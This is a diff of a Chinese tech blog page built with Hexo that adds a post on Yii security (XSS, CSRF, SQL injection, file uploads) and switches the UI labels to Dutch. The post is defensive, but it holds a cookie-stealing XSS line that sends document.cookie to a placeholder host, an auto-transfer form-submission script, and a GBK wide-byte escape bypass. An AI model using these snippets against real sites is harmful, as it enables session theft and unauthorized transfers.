@@ -54,7 +54,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Zoeken"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://luisedware.github.io"></form>
@@ -64,6 +64,76 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-Yii-框架之安全篇" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/10/29/Yii-框架之安全篇/" class="article-date">
+  <time datetime="2016-10-29T13:05:35.000Z" itemprop="datePublished">2016-10-29</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PHP/">PHP</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/10/29/Yii-框架之安全篇/">Yii 框架之安全篇</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="XSS-攻击和防范之存储"><a href="#XSS-攻击和防范之存储" class="headerlink" title="XSS 攻击和防范之存储"></a>XSS 攻击和防范之存储</h2><p>XSS 全称</p>
+<p>XSS 概念</p>
+<p>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到<br>提供给其它用户使用的页面中，从而对用户进行攻击</p>
+<h3 id="如何使用-XSS-攻击盗取用户账号"><a href="#如何使用-XSS-攻击盗取用户账号" class="headerlink" title="如何使用 XSS 攻击盗取用户账号"></a>如何使用 XSS 攻击盗取用户账号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var cookie = document.cookie;</div><div class="line">window.location.href = &quot;http://127.0.0.1/index.php?cookie=&quot;+cookie;</div></pre></td></tr></table></figure>
+<ul>
+<li>问题如下：document.cookie 获取得到的 cookie 是什么样的</li>
+<li>index.php 是如何处理 cookie 值的</li>
+<li>有了 cookie 怎么就能进行盗取账号的</li>
+</ul>
+<p>httponly 阻止 js 读取 cookie</p>
+<p>哪一段 js 代码能够自动转账<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">document.getElementById(&apos;ipt-search-key&apos;).value=&apos;withyz@xx.com&apos;;</div><div class="line">document.getElementById(&apos;amount&apos;).value=&apos;100&apos;;</div><div class="line">document.getElementById(&apos;reason&apos;).value=&apos;劫富济贫&apos;;</div><div class="line">document.getElementsByClassName(&apos;ui-button-text&apos;)[0].click();</div></pre></td></tr></table></figure></p>
+<p>如何把 js 注入到转账页面中</p>
+<h2 id="XSS-攻击和防范之反射"><a href="#XSS-攻击和防范之反射" class="headerlink" title="XSS 攻击和防范之反射"></a>XSS 攻击和防范之反射</h2><p>现代现浏览器(chrome)对于反射型XSS有一定防护<br>手动关闭：\Yii::$app-&gt;response-&gt;headers-&gt;add(‘X-XSS-Protection’, ‘0’);</p>
+<p>HTML 实体编码<br>URL 编码</p>
+<h2 id="XSS-攻击和防范之蠕虫"><a href="#XSS-攻击和防范之蠕虫" class="headerlink" title="XSS 攻击和防范之蠕虫"></a>XSS 攻击和防范之蠕虫</h2><h3 id="Yii-如何防范-XSS"><a href="#Yii-如何防范-XSS" class="headerlink" title="Yii 如何防范 XSS"></a>Yii 如何防范 XSS</h3><p>转码防范<br>\yii\helpers\Html::encode($script);</p>
+<p>过滤防范<br>\yii\helpers\HtmlPurifier::process($js);</p>
+<h2 id="CSRF-攻击和防范"><a href="#CSRF-攻击和防范" class="headerlink" title="CSRF 攻击和防范"></a>CSRF 攻击和防范</h2><p>跨站请求伪造</p>
+<p>get型的crtf攻击<br>构造url, 诱使用户点击</p>
+<p>透过例子能够看出，攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+<p>yii 框架 csrf token 验证过程</p>
+<p>检查Referer字段<br>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于www.examplebank.com之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于www.examplebank.com之下，这时候服务器就能识别出恶意的访问。<br>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。<br>添加校验token<br>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p>
+<h2 id="SQL-注入和防范"><a href="#SQL-注入和防范" class="headerlink" title="SQL 注入和防范"></a>SQL 注入和防范</h2><p>addslashes() 转义函数 防范 SQL 注入</p>
+<p>Sql注入：将要执行的sql语句采用拼接的方式组装时，就sql注入的可能；<br>原本要查询的字符串在拼接后发生发“越狱”，部分字符串被数据库识别成可执行语句，<br>导致意外的操作和查询结果<br>防范：1，屏蔽关键字和敏感词，有影响业务逻辑的可能；<br>2， 对传入变量转义，避免变量的内容越狱</p>
+<p>绕过转义：<br>char(0xdf)/‘,在utf-8下会变成β/‘,<br>而在gbk下由于汉字是2个字节组成；在数据中将变成 運’,单引号逃过了被转义</p>
+<p>使用PDO统一数据库接口，可以无痛切换；<br>使用占位符防范SQL注入</p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>文件上传漏洞<br>如果后台对文件上传审查不严，导致php代码上传后被执行，可进行遍历文件等操作使源码泄露</p>
+<p>用 fiddler 可以拦截请求,然后修改请求的内容,比如图片中的文件名,修改成如上形式后,会生成一个php文件,然后在上传后的目录执行php文件会造成危害</p>
+<p>保存上传过来的文件名的时候不要用用户本来的名称,容易在中途被非法修改,从而变成.php这些可执行文件,造成损害</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://luisedware.github.io/2016/10/29/Yii-框架之安全篇/" data-id="ciy3qn0xe0015un4bnmadbixb" class="article-share-link">Delen</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-Yii-框架之扩展篇" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -111,7 +181,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/29/Yii-框架之扩展篇/" data-id="ciy06z2st001g8x4b2rw9mrnv" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/29/Yii-框架之扩展篇/" data-id="ciy3qn0xg001dun4bq1hma27s" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
@@ -383,7 +453,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/25/Yii-框架之基础篇/" data-id="ciy06z2su001i8x4bwec93wtk" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/25/Yii-框架之基础篇/" data-id="ciy3qn0xf0018un4b13ainar9" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
@@ -486,7 +556,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/25/Yii-框架之高效篇/" data-id="ciy06z2sy001o8x4be6wyosgf" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/25/Yii-框架之高效篇/" data-id="ciy3qn0xl001lun4b2xqbyd7u" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
@@ -679,7 +749,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/20/打造扛得住的-MySQL-数据库架构/" data-id="ciy06z2up004k8x4bzy9u1a7l" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/20/打造扛得住的-MySQL-数据库架构/" data-id="ciy3qn0zn004iun4bbkzh4wso" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL/">MySQL</a></li></ul>
@@ -872,7 +942,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/13/MySQL-性能优化/" data-id="ciy06z2sk00108x4b8aop5irf" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/13/MySQL-性能优化/" data-id="ciy3qn0xc0012un4badc1qnq3" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL/">MySQL</a></li></ul>
@@ -1126,7 +1196,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/04/Linux-Shell-基础之条件判断语句/" data-id="ciy06z2ro00058x4bgl4l7ned" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/04/Linux-Shell-基础之条件判断语句/" data-id="ciy3qn0w60001un4b8gjejkjs" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
@@ -1240,7 +1310,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/04/Linux-Shell-基础之运算符/" data-id="ciy06z2rs00068x4be3o7k6ck" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/04/Linux-Shell-基础之运算符/" data-id="ciy3qn0wc0004un4bjijqy0at" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
@@ -1428,7 +1498,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/04/Linux-Shell-基础之变量/" data-id="ciy06z2rh00018x4b5uz11atk" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/04/Linux-Shell-基础之变量/" data-id="ciy3qn0w20000un4bn7r64arw" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
@@ -1473,166 +1543,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/10/03/Linux-Shell-实战/" data-id="ciy06z2rm00048x4bi3h3b8kd" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Linux-权限管理" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/09/30/Linux-权限管理/" class="article-date">
-  <time datetime="2016-09-30T06:24:23.000Z" itemprop="datePublished">2016-09-30</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Linux/">Linux</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/09/30/Linux-权限管理/">Linux 权限管理</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="基本权限"><a href="#基本权限" class="headerlink" title="基本权限"></a>基本权限</h2><ul>
-<li><code>drwxrw-r--</code><ul>
-<li>d 文件类型</li>
-<li>r 读</li>
-<li>w 写</li>
-<li>x 执行</li>
-<li>rwx 代表所有者权限</li>
-<li>rw- 代表所属组权限</li>
-<li>r– 代表其他人权限</li>
-</ul>
-</li>
-<li>权限作用<ul>
-<li>权限对文件的作用：<ul>
-<li>r 读取文件内容</li>
-<li>w 编辑、新增、修改文件内容，但是不能删除文件</li>
-<li>x 可执行</li>
-</ul>
-</li>
-<li>权限对目录的作用：<ul>
-<li>r 可以查询目录下文件名（ls）</li>
-<li>w 具有修改目录结构的权限。如新建文件和目录，删除此目录下文件和目录，重命名此目录下文件和目录，剪切（touch rm mv cp）</li>
-<li>x 可以进入目录（cd）</li>
-</ul>
-</li>
-<li>区别：<ul>
-<li>对文件来讲，最高权限是 x</li>
-<li>对目录来讲，最高权限是 w</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>权限命令<ul>
-<li>chmod</li>
-<li><code>chmod [选项] 模式 文件名</code><ul>
-<li>选项：<ul>
-<li>-R 递归</li>
-</ul>
-</li>
-<li>模式：<ul>
-<li><code>[ugoa] [+.=] [rwx]</code></li>
-<li><code>[mode=421]</code></li>
-</ul>
-</li>
-<li>例子：<ul>
-<li><code>chmod u+x cangls.av</code></li>
-<li><code>chmod a=rwx fengjie.av</code></li>
-<li><code>chmod g+w,o+w furong.av</code></li>
-</ul>
-</li>
-<li>权限的数字表示<ul>
-<li>r 4</li>
-<li>w 2</li>
-<li>x 1</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>chgrp<ul>
-<li><code>chgrp 组名 文件名</code> 修改文件的所属组</li>
-</ul>
-</li>
-<li>chown<ul>
-<li><code>chown 用户名 文件名</code> 修改文件的所有者</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="默认权限"><a href="#默认权限" class="headerlink" title="默认权限"></a>默认权限</h2><ul>
-<li>umask 查看默认权限<ul>
-<li>0022<ul>
-<li>第一位 0：文件特殊权限</li>
-<li>022：文件默认权限</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>修改 umask 值<ul>
-<li>临时修改<ul>
-<li>umask 0002</li>
-</ul>
-</li>
-<li>永久修改<ul>
-<li>vim /etc/profile</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>文件的默认权限特点</p>
-<ul>
-<li>文件默认不能建立为执行文件，必须手工赋予执行权限</li>
-<li>文件默认权限最大为 666</li>
-<li>默认权限需要换算成字母再相减</li>
-<li>建立文件之后的默认权限，为 666 减去 umask 值<ul>
-<li>例子：<ul>
-<li>文件默认最大权限 666，umask 值 022</li>
-<li><code>-rw-rw-rw- 减去 -----w--w- 等于 -rw-r--r--</code>，结果为 644</li>
-<li><code>-rw-rw-rw- 键入 -----wx-wx 等于 -rw-r--r--</code>，结果为 644</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>目录的默认权限特点</p>
-<ul>
-<li>目录默认权限最大为 777</li>
-<li>默认权限需要换算成字母再相减</li>
-<li>建立文件之后的默认权限，为 777 减去 umask 值<ul>
-<li>例子：<ul>
-<li>目录默认最大权限为 777，umask 值 022</li>
-<li><code>-rwxrwxrwx 减去 -----w--w- 等于 -rwxr-xr-x</code>，结果为 755</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://luisedware.github.io/2016/09/30/Linux-权限管理/" data-id="ciy06z2s3000i8x4byshyyn96" class="article-share-link">Share</a>
+      <a data-url="http://luisedware.github.io/2016/10/03/Linux-Shell-实战/" data-id="ciy3qn0we0005un4bktwmxkhq" class="article-share-link">Delen</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
@@ -1647,7 +1558,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">__('next') &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">__('next') &raquo;</a>
   </nav>
 </section>
         
@@ -1655,7 +1566,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
+    <h3 class="widget-title">Categorieën</h3>
     <div class="widget">
       <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Tooling/">Tooling</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/UML/">UML</a></li></ul>
     </div>
@@ -1665,7 +1576,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
+    <h3 class="widget-title">Labels</h3>
     <div class="widget">
       <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AliCloud/">AliCloud</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Laravel/">Laravel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHPStorm/">PHPStorm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sublime-Text-3/">Sublime Text 3</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UML/">UML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li></ul>
     </div>
@@ -1684,7 +1595,7 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Archieven</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li></ul>
     </div>
@@ -1694,9 +1605,13 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Recente berichten</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（三）/">使用 Laravel 与 Vue.js 进行微信开发（三）</a>
+          </li>
         
           <li>
             <a href="/2017/01/16/使用-Laravel-与-Vue-js-进行微信开发（二）/">使用 Laravel 与 Vue.js 进行微信开发（二）</a>
@@ -1712,10 +1627,6 @@ $cat-&gt;off(&apos;miao&apos;,[$dog,&apos;look&apos;]);//dog取消关注cat的mi
         
           <li>
             <a href="/2016/12/02/Yii2-Working-with-Databases/">Yii2 Working with Databases</a>
-          </li>
-        
-          <li>
-            <a href="/2016/11/22/关于-PHP-函数-array-walk-的一些想法/">关于 PHP 函数 array_walk 的一些想法</a>
           </li>
         
       </ul>
